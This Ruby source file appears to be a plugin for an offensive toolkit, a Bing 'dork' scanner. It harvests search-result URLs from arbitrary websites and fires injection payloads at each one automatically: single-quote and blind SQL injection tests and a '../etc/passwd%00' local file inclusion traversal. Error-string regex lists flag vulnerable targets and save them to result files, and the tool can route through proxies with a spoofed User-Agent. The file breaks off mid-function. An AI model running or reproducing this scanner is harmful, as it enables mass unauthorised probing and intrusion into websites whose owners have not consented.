# Ding Bing Dork Scanner Plugin

class Ding < Core::CoreShell
	def initialize
		#Basic Info:
		module_name='DingDorker'
		module_info={
			'Name'        => 'Ding Dork Scanner',
			'Version'     => 'v0.01b',
			'Description' => "This is a Simple Bing Dorker. You provide it with the search term or query and it will run it through Bing! Search Engine. It will then take all of the results found and check for various signs of vulnerabilities using the settings provided. Uses a strong regex based checking mechanism so it wont capture everything but it does a good job all the same....\n\tSearchType => 0=Single Dork, 1=Mass File Based Dorking\n\tLevel => Level of Tests to Perform with Search\n\t\t0 => Run Single Quote Injection Test (default)\n\t\t1 => Run Blind Injection Test\n\t\t2 => Run /etc/passwd LFI Injection Test\n\t\t3 => Single Quote + Blind Test\n\t\t4 => Single Quote + /etc/passwd Test\n\t\t5 => Perform All Tests\n\tSearchTerm => Sets the dork or search term to be used for Single Dork option\n\tFile => Should point to the file with one dork per line to use for Mass Dorking\n\tIP => IP Address to combine with BING dork(s) for checking shared server vulns\n\tCountryCode => Country Code or Domain Type to narrow search results (COM, MIL, EDU, CN, DE, UK...)\n\tProxyIp => Proxy IP Address to Use\n\tProxyPort => Proxy Port to use\n\tUsername/Password => Used for Authentication with HTTP Basic Auth OR Proxy Auth",
			'Author'      => 'Hood3dRob1n'
		}

		module_required={ 'SearchType' => '0', 'Level' => '0' } #Hash full of "Required" Options
		module_optional={ 'SearchTerm' => ".php?id=1", 'File' => 'nil', 'IP' => 'nil', 'CountryCode' => "COM", 'ProxyIp' => 'nil', 'ProxyPort' => 'nil', 'Username' => 'nil', 'Password' => 'nil' } #Hash of "Optional" Options
		@non_set_private_options={ 'Auth' => 0, 'Cookie' => 'nil' } 

		if $module_name.nil?
			pluginRegistrar(module_name,module_info,module_required,module_optional)
		else
			#Results folder....
			resDir = "#{$results}/ding/"
			Dir.mkdir(resDir) unless File.exists?(resDir)
			#Start things up we are being re-loaded by the run/exploit command
			if $module_required['SearchType'].to_i == 1
				if File.exist?($module_optional['File']) #Make sure the file they provide is a valid file if using mass dork option...
					dorkit
				else
					puts "\nProvided file doesn't exist! Please check path or permissions and try again".light_red + "........".cyan
				end
			else
				dorkit
			end
		end
	end

	def dorkit
		#Initialize our Http::EasyCurb request object with any special values needed, otherwise mark them to nil....
		@http = Http::EasyCurb.new(@non_set_private_options['Cookie'],@non_set_private_options['Auth'],$module_optional['ProxyIp'],$module_optional['ProxyPort'],$module_optional['Username'],$module_optional['Password'])

		#For use later with open-uri calls....
		if $module_optional['ProxyIp'] == 'nil'
			@non_set_private_options['Proxy'] = 'nil'
		else
			@non_set_private_options['Proxy'] = "http://#{$module_optional['ProxyIp']}:#{$module_optional['ProxyPort']}"
		end

		#Route accordingly based on single dork or mass dorking option
		if not $module_required['SearchType'].to_i == 1
			puts "[".light_green + "*".white + "] Making a Single dork run".light_green + ".......".white
			searchq($module_optional['SearchTerm'].gsub(' ', '%20'), 1)
			puts
			fooresults = File.open("#{$results}/ding2.results", 'r')
			rescount = fooresults.readlines
			puts "[".light_green + "*".white + "] Total Number of Unique Testable Links Found".light_green + ": #{rescount.length}".white
			puts "#{rescount.join}\n".cyan
			puts "[".light_green + "*".white + "]Check ".light_green + "#{$results}/ding/ding2.results".white + " file if you didn't catch everything in the terminal output just now".light_green + "......".white
		else
			puts "[".light_green + "*".white + "] Mass dorking with file option".light_green + ".......".white
			FileUtils.rm("#{$results}/ding/ding2.results") if File.exists?("#{$results}/ding/ding2.results") #remove results file if it exists as we use append mode for file search to keep track of all results

			#Use multi-threading for file options since we are using more than one dork!
			threads = [] #array to hold our threads
			mutex = Mutex.new #Try to keep our threads playing nicely while they run searches
			File.open($module_optional['File'], "r").each do |mass_dork|
				thread = Thread.new do #yeah threads, much faster now!!!!!!!!!!!!!!!!!!
					dork = mass_dork.gsub(' ', '%20').chomp #Set current dork so we can build link		
					mutex.synchronize do #so they all do it in sync and not all whacky. We should really wrap this whole thread subsection including the search calls but it slows things down like crazy and so far I have not seen any side affects of not using Mutex (results same using vs not, with difference being significant time savings). Enjoy or re-write it and show me another way thats not so slow :p
						puts "[".light_green + "*".white + "] Checking Bing using ".light_green + "'".cyan + "#{dork}".white + "'".cyan + " hang tight".light_green + "....".white
					end
					#Call search function with each dork in its own thread :)
					searchq(dork, 2)
				end
				threads << thread #place thread in array for storage
			end
			threads.each { |thread| thread.join } #make sure all threads finished safely before moving on
			mutex.lock #no more changes!

			fooresults = File.open("#{$results}/ding/ding2.results", 'r')
			rescount = fooresults.readlines
			cls
			puts "[".light_green + "*".white + "] Total Number of Unique Testable Links Found".light_green + ": #{rescount.length}".white
			puts "#{rescount.join}\n".green
			puts "[".light_green + "*".white + "] Check ".light_green + "#{$results}/ding/ding2.results".white + " file if you didn't catch everything in the terminal output just now".light_green + "......".white
			puts
		end
		testme
	end

	def testme
		#Now we send our results through our checks....
		#Run The Basic Single Quote Injection Test
		if not $module_required['Level'].to_i == 1 and not $module_required['Level'].to_i == 2
			cls
			if $module_required['SearchType'].to_i == 0 #Single Dork Option
				quoteTest(1) #1 = write
			elsif $module_required['SearchType'].to_i == 1 #File Based Mass Dork Option
				quoteTest(2) #2 = append since we will re-use due to fact we are using file system for mass dorking.....
			end
		end

		#RUn Very Basic BLIND SQL Injection Test
		if $module_required['Level'].to_i == 1 or $module_required['Level'].to_i == 3 or $module_required['Level'].to_i == 5
			cls
			if $module_required['SearchType'].to_i == 0
				blindTest(1)
			elsif $module_required['SearchType'].to_i == 1
				blindTest(2)
			end
		end

		#Run /etc/passwd LFI test
		if $module_required['Level'].to_i == 2 or $module_required['Level'].to_i == 4 or $module_required['Level'].to_i == 5
			cls
			if $module_required['SearchType'].to_i == 0
				etcTest(1)
			elsif $module_required['SearchType'].to_i == 1
				etcTest(2)
			end
		end
	end

	def searchq(dork, num) #dork = dork, num=1 then write, num=2 append, ip to use with dork or nil if not needed
		# Array of sites we want to avoid for one reason or another...add to the array as you like...
		bad_sites = [ "bing.com", "msn.com", "microsoft.com", "yahoo.com", "live.com", "microsofttranslator.com", "irongeek.com", "tefneth-import.com", "hackforums.net", "freelancer.com", "facebook.com", "mozilla.org", "stackoverflow.com", "php.net", "wikipedia.org", "amazon.com", "4shared.com", "wordpress.org", "about.com", "phpbuilder.com", "phpnuke.org", "linearcity.hk", "youtube.com", "ptjaviergroup.com", "p4kurd.com", "tizag.com", "discoverbing.com", "devshed.com", "ashiyane.org", "owasp.org", "1923turk.com", "fictionbook.org", "silenthacker.do.am", "v4-team.com", "codingforums.com", "tudosobrehacker.com", "zymic.com", "forums.whirlpool.net.au", "gaza-hacker.com", "immortaltechnique.co.uk", "w3schools.com", "phpeasystep.com", "mcafee.com", "specialinterestarms.com", "pastesite.com", "pastebin.com", "joomla.org", "joomla.fr", "sourceforge.net", "joesjewelry.com" ]
		if not $module_optional['IP'] == 'nil'
			dip = "ip:#{$module_optional['IP']}"
		end
		count=9 #base count for bing page reading loop
		links=[] #blank array we will put our links in as we find them in our coming loop....
		while count.to_i <= 225 do #Set while loop so we can grab ~20 pages of results
			if $module_optional['IP'] == 'nil'
				bing = 'http://www.bing.com/search?q=' + dork.to_s + "%20" + $module_optional['CountryCode'].to_s + '&qs=n&pq=' + dork.to_s + "%20" + $module_optional['CountryCode'].to_s + '&sc=8-5&sp=-1&sk=&first=' + count.to_s + '&FORM=PORE'
			else
				bing = 'http://www.bing.com/search?q=' + dip + '+' + dork.to_s + "%20" + $module_optional['CountryCode'].to_s + '&qs=n&pq=' + dip + '+' + dork.to_s + "%20" + $module_optional['CountryCode'].to_s + '&sc=8-5&sp=-1&sk=&first=' + count.to_s + '&FORM=PORE'
			end
			begin
				if $module_optional['ProxyIp'] == 'nil' #NEW TIMEOUT & Proxy Options just for Squirmy :)
					#RUN NORMAL REQUEST
					page = Nokogiri::HTML(open(bing, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)'})) #Create an object we can parse with Nokogiri ;)
				else
					if $module_optional['Username'] == 'nil'
						#RUN PROXY WITHOUT AUTH
						page = Nokogiri::HTML(open(bing, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :proxy => "#{@non_set_private_options['Proxy']}"}))
					else
						#RUN PROXY WITH AUTH
						page = Nokogiri::HTML(open(bing, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :proxy_http_basic_authentication => ["#{@non_set_private_options['Proxy']}", "#{$module_optional['Username']}", "#{$module_optional['Password']}"]}))
					end
				end
			rescue
				next
			end
			possibles = page.css("a") #parse out the <a> elements which contain our href links 
			possibles.select do |link| #cycle through possibles array and print links found
				begin
					if link =~ /.+\.msn\.com\/.+/ or link =~ /.+advertise\.bingads\.microsoft\.com\/.+/
						#DO NOTHING
					else
						url = URI.parse(link['href']) #use URI.parse to build check around for links
						if url.scheme == 'http' || url.scheme =='https' #if full http(s):// passed then use link
							links << link['href']
						end
					end
				rescue URI::InvalidURIError => err 
					# If bad link cause error cause its not a link dont freak out....
					#Dont do anything, just keep on moving....got something better?
				end
			end
			# Use \r to write over previous line (currently causes blank until last one finishes, meh)
			if num.to_i == 1
				print "\r" + "[".light_green + "*".white + "] Number of Links Found".light_green + ": #{links.length}".white 
			end
			count = count.to_i + 12 #increment our count using Bing's weird counting system for next page results :p
		end #count now > 225, exit the loop...

		links = links.uniq #remove duplicate links from our array we created in loop above
		# Sort work done so far and find which links are usable (remove known bad sites or waste of time sites)
		if num.to_i == 1
			puts "\n[".light_green + "*".white + "] Testable Links".light_green + ": #{links.length}".white
		end
		count=0 #reset count value
		vlinks=[] #placeholder array for valid links
		blinks=[] #placeholder array for bad links
		while count.to_i < links.length do #Start loop until we have tested each link in our links array
			bad_sites.each do |foo| # cycle through bad links so we can test each against good links
				badchk = URI.parse(links[count]) #use URI.parse to give us a .host value to check against
				chk1 = badchk.host.to_s.split('.') #split to gauge if sub-domains are part of link

				if chk1.length > 2 #if subs split into usable chunks
					badchk2 = badchk.host.to_s.split('.', 2) #split in 2 pieces
					bad = badchk2[1] #ditch sub, use main domain for comparison against .host value
				else
					bad = badchk.host # no split needed, just use for comparison
				end

				if bad == foo #if our base .host value = bad then site is on no-no list
					blinks << links[count] #put the no-no's in own array
				else
					vlinks << links[count] #put those that pass in separate array
				end
			end
			count += 1 #increment count so eventually we break out of this loop :p
		end
		vlinks = vlinks.uniq #remove dups for valid links array
		vlinks.each do |link|
			if link =~ /.+\.msn\.com\/.+/ or link =~ /.+advertise\.bingads\.microsoft\.com\/.+/
				blinks << link
			end
		end
		blinks = blinks.uniq #remove dups for bad links array
		rlinks = vlinks - blinks #remove all bad links from our valid links array, leaving just testable links!
		if num.to_i == 1
			results = File.open("#{$results}/ding/ding2.results", "w+")  #Open our file handle
		else
			results = File.open("#{$results}/ding/ding2.results", "a+")  #Open our file handle
		end
		rlinks.each do |reallinks| #cycle through good links
			results.puts reallinks #print results to storage file for safe keeping (handle.puts)
		end
		results.close #close our file handle we opened a minute ago
	end

	def regexCheck(url, response, key, value) #Pass the injected url, a response body ARRAY and we will check if it has anything matching any of our special indicators, the key and value from our URL we were testing to get the response

		# Signs of ColdFusion Server
		coldfusion_err = [ "Invalid CFML construct found", "CFM compiler", "ColdFusion documentation", "Context validation error for tag cfif", "ERROR.queryString", "Error Executing Database Query", "SQLServer JDBC Driver", "coldFusion.sql.Parameter", "JDBC SQL", "JDBC error", "SequeLink JDBC Driver", "Invalid data .+ for CFSQLTYPE CF_SQL_INTEGER" ]

		# Misc Errors, Coding Flaws, etc
		misc_err= [ "Microsoft VBScript runtime", "Microsoft VBScript compilation", "Invision Power Board Database Error", "DB2 ODBC", "DB2 error", "DB2 Driver", "unexpected end of SQL command", "invalid query", "SQL command not properly ended", "An illegal character has been found in the statement", "Active Server Pages error", "ASP.NET_SessionId", "ASP.NET is configured to show verbose error messages", "A syntax error has occurred", "Unclosed quotation mark", "Input string was not in a correct format", "<b>Warning</b>: array_merge", "Warning: array_merge", "Warning: preg_match", "<b>Warning</b>: preg_match", "<exception-type>java.lang.Throwable" ]

		# MS-Access
		msaccess_err  = [ "Microsoft JET Database Engine", "ADODB.Command", "ADODB.Field error", "Microsoft Access Driver", "ODBC Microsoft Access", "BOF or EOF" ]

		# MS-SQL
		mssql_err = [ "Microsoft OLE DB Provider for SQL Server error", "OLE/DB provider returned message", "ODBC SQL Server", "ODBC Error", "Microsoft SQL Native Client" ]

		# MySQL
		mysql_err = [ "<b>Warning</b>: mysql_query", "Warning: mysql_query", "<b>Warning</b>: mysql_fetch_row", "Warning: mysql_fetch_row", "<b>Warning</b>: mysql_fetch_array", "Warning: mysql_fetch_array", "<b>Warning</b>: mysql_fetch_assoc", "Warning: mysql_fetch_assoc", "<b>Warning</b>: mysql_fetch_object", "Warning: mysql_fetch_object", "<b>Warning</b>: mysql_numrows", "Warning: mysql_numrows", "<b>Warning</b>: mysql_num_rows", "Warning: mysql_num_rows", "MySQL Error", "MySQL ODBC", "MySQL Driver", "supplied argument is not a valid MySQL result resource", "error in your SQL syntax", "on MySQL result index", "JDBC MySQL", "<b>Warning</b>: mysql_result", "Warning: mysql_result" ]

		# Oracle
		oracle_err = [ "Oracle ODBC", "Oracle Error", "Oracle Driver", "Oracle DB2", "ODBC DB2", "ODBC Oracle", "JDBC Oracle", "ORA-01756", "ORA-00936", "ORA-00921", "ORA-01400", "ORA-01858", "ORA-06502", "ORA-00921", "ORA-01427", "ORA-00942", "<b>Warning</b>: ociexecute", "Warning: ociexecute", "<b>Warning</b>: ocifetchstatement", "Warning: ocifetchstatement", "<b>Warning</b>:  ocifetchinto", "Warning:  ocifetchinto", "error ORA-" ]

		# Postgresql
		pg_err = [ "<b>Warning</b>: pg_connect", "Warning: pg_connect", "<b>Warning</b>:  simplexml_load_file", "Warning:  simplexml_load_file", "Supplied argument is not a valid PostgreSQL result", "PostgreSQL query failed: ERROR: parser: parse error", "<b>Warning</b>: pg_exec", "Warning: pg_exec" ]

		# File Includes
		lfi_err = [ "<b>Warning</b>:  include", "Warning: include", "<b>Warning</b>: require_once", "Warning: require_once", "Disallowed Parent Path", "<b>Warning</b>: main", "Warning: main", "<b>Warning</b>: session_start", "Warning: session_start", "<b>Warning</b>: getimagesize", "Warning: getimagesize", "<b>Warning</b>: include_once", "Warning: include_once" ]

		# Eval()
		eval_err = [ "eval()'d code</b> on line", "eval()'d code on line", "<b>Warning</b>:  Division by zero", "Warning:  Division by zero", "<b>Parse error</b>: syntax error, unexpected", "Parse error: syntax error, unexpected", "<b>Parse error</b>: parse error in", "Parse error: parse error in", "Notice: Undefined variable: node in eval", "<b>Notice</b>: Undefined variable: node in eval" ]

		############Add Your Array for Regex Check and follow the cycles below to build your own for your added array...

		#LFI Test
		tracker=0
		lfi_err.each do |lfi|
			response.each do |resp_line|
				resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
				if resp_line =~ /#{lfi}/
					if tracker < 1
						puts "[LFI] ".light_green + "#{lfi.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("#{$results}/ding/lfi.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			end
		end

		#Cold Fusion Test
		tracker=0
		coldfusion_err.each do |cold|
			response.each do |resp_line|
				resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding? #Thanks StackOverflow :)
				if resp_line =~ /#{cold}/
					if tracker < 1
						puts "[ColdFusion] ".light_green + "#{cold.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("#{$results}/ding/coldfusion.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
					end
					tracker += 1
				end
			end
		end

		#MySQL Test
		tracker=0
		mysql_err.each do |lqsym|
			response.each do |resp_line|
				resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
				if resp_line =~ /#{lqsym}/
					if tracker < 1
						puts "[MySQLi] ".light_green + "#{lqsym.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("#{$results}/ding/mysqli.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			end
		end

		#MS-SQL Test
		tracker=0
		mssql_err.each do |lqssm|
			response.each do |resp_line|
				resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
				if resp_line =~ /#{lqssm}/
					if tracker < 1
						puts "[MS-SQLi] ".light_green + "#{lqssm.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("#{$results}/ding/mssqli.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			end
		end
		tracker=0

		#MS-Access Test 
		msaccess_err.each do |lqsasm|
			response.each do |resp_line|
				resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
				if resp_line =~ /#{lqsasm}/
					if tracker < 1
						puts "[MS-Access SQLi] ".light_green + "#{lqsasm.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("#{$results}/ding/msaccess.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping 
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			end
		end

		#Postgresql Test
		tracker=0
		pg_err.each do |lqspg|
			response.each do |resp_line|
				resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
				if resp_line =~ /#{lqspg}/
					if tracker < 1
						puts "[Postgres SQLi] ".light_green + "#{lqspg.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("#{$results}/ding/pgsqli.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			end
		end

		#Oracle Test 
		tracker=0
		oracle_err.each do |ora|
			response.each do |resp_line|
				resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
				if resp_line =~ /#{ora}/
					if tracker < 1
						puts "[Oracle SQLi] ".light_green + "#{ora.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("#{$results}/ding/oracle.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			end
		end

		#Misc Error Messages that might be worth investigating
		tracker=0
		misc_err.each do |misc|
			response.each do |resp_line|
				resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
				if resp_line =~ /#{misc}/
					if tracker < 1
						puts "[Error => vuln?] ".light_green + "#{misc.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("#{$results}/ding/misc.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
						tracker += 1
					end
				end
			end
		end

		# Eval() Test
		tracker=0
		eval_err.each do |evalz|
			response.each do |resp_line|
				resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding? #Thanks StackOverflow :)
				if resp_line =~ /#{evalz}/
					if tracker < 1
						puts "[Eval()] ".light_green + "#{evalz.sub(/<b>/, '').sub(/<\/b>/, '')}".green
						puts "\t=> #{url.chomp}".cyan
						puts "\t\t=> Vuln Paramater: ".cyan + "#{key}".white unless key.nil?
						puts "\t\t=> Original Value: ".cyan + "#{value}".white unless value.nil?
						vlinks = File.new("#{$results}/ding/eval.results", "a+")  #Open our file handle
						vlinks.puts "#{url.chomp}" #Write to file for safe keeping
						vlinks.close #close our file handle we opened a minute ago
					end
					tracker += 1
				end
			end
		end
	end

	def quoteTest(num) #1=Single Dork, 2=File Option (threads?)
		puts "[".light_green + "*".white + "] Commencing Injection Tests".light_green + "....".white
		File.open("#{$results}/ding/ding2.results", "r").each do |line|
			if line =~ /r.msn.com/ or line =~ /bingads.microsoft.com/
				next
			end
			begin
				param = URI.parse(line).query #See if we cause any errors to weed out no parameter links....
				#break paramaters into hash [ "key" => "value" ] formatting held in storage for easier manipulation
				params = Hash[URI.parse(line).query.split('&').map{ |q| q.split('=') }] 
				puts "[".light_red + "*".white + "] Testing Link".light_red + ": #{line.chomp}".white
				count=0
				tracker=0
				params.each do |key, value| #cycle through hash and print key and associated value
					@key = key
					@value = value
					if params.length > 1 #Multiple Parameter Links
						injlnk = line.sub("#{value}", "#{value}%27") #Set a injection link variable
						@injlnk = injlnk
						if count == 0
							puts "\t=> Multiple Paramters, testing all".light_blue + "....".cyan
							count += 1
						end

						if $module_optional['ProxyIp'] == 'nil' #NEW TIMEOUT & Proxy Options just for Squirmy :)
							#RUN NORMAL REQUEST
							vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
						else
							if $module_optional['Username'] == 'nil'
								#RUN PROXY WITHOUT AUTH
								vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@non_set_private_options['Proxy']}"}).readlines
							else
								#RUN PROXY WITH AUTH
								vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@non_set_private_options['Proxy']}", "#{$module_optional['Username']}", "#{$module_optional['Password']}"]}).readlines
							end
						end
						regexCheck(injlnk, vchk, key, value)
					else #############<=ELSE SINGLE PARAMETER LINKS=>##############
						injlnk = line.sub("#{value}", "#{value}%27") #Set a injection link variable
						@injlnk = injlnk
						if $module_optional['ProxyIp'] == 'nil' #NEW TIMEOUT & Proxy Options just for Squirmy :)
							#RUN NORMAL REQUEST
							vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
						else
							if $module_optional['Username'] == 'nil'
								#RUN PROXY WITHOUT AUTH
								vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@non_set_private_options['Proxy']}"}).readlines
							else
								#RUN PROXY WITH AUTH
								vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@non_set_private_options['Proxy']}", "#{$module_optional['Username']}", "#{$module_optional['Password']}"]}).readlines
							end
						end
						regexCheck(injlnk, vchk, key, value)
					end
				end
			#random HTTP errors, i.e. skip link but note error
			rescue OpenURI::HTTPError => e
				if e.to_s == "404 Not Found"
					puts "\t=> #{e}".red
					next
				elsif e.to_s == "500 Internal Server Error"
					#something to scan page anyways for ASP stupid Winblows sites
					puts "\t=> #{e}".red
					puts "\tRunning additional checks".light_blue + ".....".white
					foores = e.io.readlines
					regexCheck(@injlnk, foores, @key, @value)
				else
					puts "\t=> #{e}".red
				end
			rescue Net::HTTPBadResponse
				puts "\t=> Problem reading response due to TOR, sorry".red + "......".white
			rescue Errno::ECONNREFUSED
				puts "\t=> Problem communicating with site, connection refused".red + "!".white
			rescue Errno::EHOSTUNREACH
				puts "\t=> Problem communicating with site, host unreachable".red + "!".white
			rescue EOFError
				puts "\t=> Problem communicating with site".red + "....".white
			rescue Errno::EINVAL => e
				puts "\t=> #{e}".yellow
			rescue SocketError
				puts "\t=> Problem connecting to site".red + "....".white
			rescue OpenSSL::SSL::SSLError
				puts "\t=> Issues with Remote Host's OpenSSL Server Certificate".red + "....".white
			rescue Errno::ENOENT
				puts "\t=> Jacked URL parsing due to no value with parameter, sorry".red + "....".white
				next
			rescue Errno::ECONNRESET
				puts "\t=> Problem connecting to site".red + "....".white
			rescue RuntimeError => e
				if e.to_s == 'Timeout::Error' # we took longer than read_timeout value said they could :p
					puts "\t=> Connection Timeout".red + "!".cyan
			#open-uri cant redirect properly from http to https due to a check it has built-in, so cant follow redirect :(
				else
					puts "\t=> Can't properly follow the redirect!".red
				end
			rescue Timeout::Error
				#timeout of sorts...skip
				puts "\t=> Connection Timeout!".red
			rescue Errno::ETIMEDOUT
				#timeout of sorts...skip
				puts "\t=> Connection Timeout".red + "!".white
			rescue TypeError
				#Jacked up URL parsing or something like this....
				puts "\t=> Jacked URL parsing for some reason, sorry".red + "....".white
				next
			rescue URI::InvalidURIError
				#Jacked up URL parsing or something like this....
				puts "\t=> Jacked URL parsing for some reason, sorry".red + "....".white
				next
			rescue NoMethodError => e
			# If bad link cause error cause its not a link dont freak out....Dont do anything....got something better?
				puts "[".light_red + "*".white + "] Testing Link".light_red + ": #{line.chomp}".white
				puts "\t=> No Testable Paramaters!".red
			end
		end
	end

	#LFI /etc/passwd Injection Test using a genric length injection and regex check for signs of success
	def etcTest(num) #1=Single Dork, 2=File Option (threads?) #Am i using num var anymore??
		puts "[".light_green + "*".white + "] Commencing ".light_green + "/etc/passwd ".white + "LFI Injection Tests".light_green + "....".white
		File.open("#{$results}/ding/ding2.results", "r").each do |line|
			if line =~ /r.msn.com/ or line =~ /bingads.microsoft.com/
				next
			end
			begin
				param = URI.parse(line).query #See if we cause any errors to weed out no parameter links....
				#break paramaters into hash [ "key" => "value" ] formatting held in storage for easier manipulation
				params = Hash[URI.parse(line).query.split('&').map{ |q| q.split('=') }] 
				puts "[".light_red + "*".white + "] Testing Link".light_red + ": #{line.chomp}".white
				count=0
				tracker=0
				params.each do |key, value| #cycle through hash and print key and associated value
					@key = key
					@value = value
					if params.length > 1 #Multiple Parameter Links
						injlnk = line.sub("#{value}", "../../../../../../../../../etc/passwd%00") #Set a injection link variable
						@injlnk = injlnk
						if count == 0
							puts "\t=> Multiple Paramters, testing all".light_blue + "....".cyan
							count += 1
						end
						if $module_optional['ProxyIp'] == 'nil' #NEW TIMEOUT & Proxy Options just for Squirmy :)
							#RUN NORMAL REQUEST
							vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
						else
							if $module_optional['Username'] == 'nil'
								#RUN PROXY WITHOUT AUTH
								vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@non_set_private_options['Proxy']}"}).readlines
							else
								#RUN PROXY WITH AUTH
								vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@non_set_private_options['Proxy']}", "#{$module_optional['Username']}", "#{$module_optional['Password']}"]}).readlines
							end
